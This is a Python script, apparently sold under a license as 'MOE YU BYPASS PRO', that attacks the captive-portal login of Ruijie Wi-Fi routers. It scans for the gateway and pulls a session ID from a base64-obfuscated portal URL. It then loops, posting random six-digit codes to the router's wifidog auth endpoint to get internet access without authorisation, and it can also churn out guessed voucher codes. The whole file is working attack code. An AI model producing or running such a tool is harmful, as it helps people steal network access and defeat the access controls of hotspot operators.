import os
import re
import sys
import time
import json
import base64
import random
import string
import hashlib
import asyncio
import aiohttp
import requests
import argparse
from datetime import datetime

# --- CONFIGURATION (GitHub Database Link) ---
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"
ID_STORAGE = ".moeyu_device_id"

# Colors
w, g, y, r, b, c = "\033[1;37m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m", "\033[1;36m"

def get_hwid():
    """Fixed ID ကို ဖိုင်ထဲတွင် အသေသိမ်းထားပြီး ပြန်ထုတ်ပေးခြင်း"""
    if os.path.exists(ID_STORAGE):
        with open(ID_STORAGE, "r") as f:
            return f.read().strip()
    else:
        user = os.popen('whoami').read().strip()
        model = os.popen('getprop ro.product.model').read().strip()
        raw = f"{user}-{model}-{random.randint(111111, 999999)}"
        new_id = hashlib.md5(raw.encode()).hexdigest().upper()
        with open(ID_STORAGE, "w") as f:
            f.write(new_id)
        return new_id

def Logo():
    os.system("clear")
    my_id = get_hwid()
    logo = f"""{r}
 ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
 ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
 ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
 ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
 ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
{g}         ── {w}MOE YU BYPASS PRO {g}──{w}"""
    print(logo)
    print(f"{y}─" * 50)
    print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
    print(f"{g}  [🆔] {w}Fixed ID : {c}{my_id}")
    print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
    print(f"{y}─" * 50)

def check_key():
    """GitHub Database မှ License ကို စစ်ဆေးခြင်း"""
    my_id = get_hwid()
    Logo()
    print(f"{y}[*] Verifying Secure License...{w}")
    try:
        # Cache ကျော်ရန် Header နှင့် Timestamp သုံးသည်
        headers = {'User-Agent': 'Mozilla/5.0', 'Cache-Control': 'no-cache'}
        res = requests.get(f"{KEY_URL}?t={int(time.time())}", headers=headers, timeout=15)
        
        if res.status_code == 200:
            lines = res.text.splitlines()
            for line in lines:
                if "|" in line:
                    db_key, exp_str = [x.strip() for x in line.strip().split("|")]
                    if db_key == my_id:
                        today = datetime.now().date()
                        expiry = datetime.strptime(exp_str, "%Y-%m-%d").date()
                        if today <= expiry:
                            print(f"{g}[+] Access Authorized! Welcome Moe Yu.{w}")
                            time.sleep(1.2)
                            return True
            
            print(f"{r}[!] UNREGISTERED ID!{w}")
            print(f"{y}[>] Your Fixed ID: {c}{my_id}{w}")
            sys.exit()
    except:
        print(f"{r}[!] Connection Failed!{w}")
        sys.exit()

async def get_sid(session, url, prev):
    try:
        async with session.get(url, timeout=5) as r:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url)).group(1)
    except: return prev

class BypassEngine:
    def __init__(self):
        # Ruijie Session URL
        self.url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try: self.ip = open(".ip", "r").read().strip()
        except: self.ip = "192.168.0.1"

    async def start(self):
        Logo()
        print(f"{y}[*] Running Internet Bypass Loop...{w}")
        async with aiohttp.ClientSession() as s:
            while True:
                sid = await get_sid(s, self.url, None)
                code = "".join(random.choice(string.digits) for _ in range(6))
                try:
                    async with s.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                        print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Bypass: {res.status}")
                except: pass
                await asyncio.sleep(1)

async def Generator(mode, length, speed):
    """Alias 'san' အတွက် Voucher code ထုတ်ပေးသည့် Logic"""
    Logo()
    print(f"{y}[*] Generating (Mode: {mode}, Speed: {speed})...{w}")
    chars = string.digits if mode == "digit" else string.ascii_letters + string.digits
    delay = 1 / speed if speed > 0 else 0.01
    while True:
        code = "".join(random.choice(chars) for _ in range(length))
        print(f"{g}[+] Code: {w}{code}")
        await asyncio.sleep(delay)

def run():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["internet", "setup", "code"], required=True)
    parser.add_argument("-m", "--mode", choices=["digit", "ascii"], default="digit")
    parser.add_argument("-l", "--length", type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    args = parser.parse_args()

    if args.option == "setup":
        Logo()
        print(f"{y}[*] Scanning for Router Gateway...{w}")
        # Common Ruijie Gateways စမ်းသပ်ခြင်း
        gateways = ["192.168.0.1", "192.168.1.1", "192.168.99.1", "10.0.0.1"]
        success = False
        for test_ip in gateways:
            try:
                r = requests.get(f"http://{test_ip}", timeout=2)
                if r.status_code == 200:
                    with open(".ip", "w") as f: f.write(test_ip)
                    print(f"{g}[+] Setup Success! Gateway Found: {test_ip}{w}")
                    success = True
                    break
            except: continue
        if not success:
            print(f"{r}[!] Setup Failed. Please connect to WiFi first.{w}")
    
    elif args.option == "internet":
        asyncio.run(BypassEngine().start())
    
    elif args.option == "code":
        asyncio.run(Generator(args.mode, args.length, args.speed))

if __name__ == "__main__":
    if check_key():
        try: run()
        except KeyboardInterrupt: print(f"\n{r}[!] Tool Stopped.{w}")
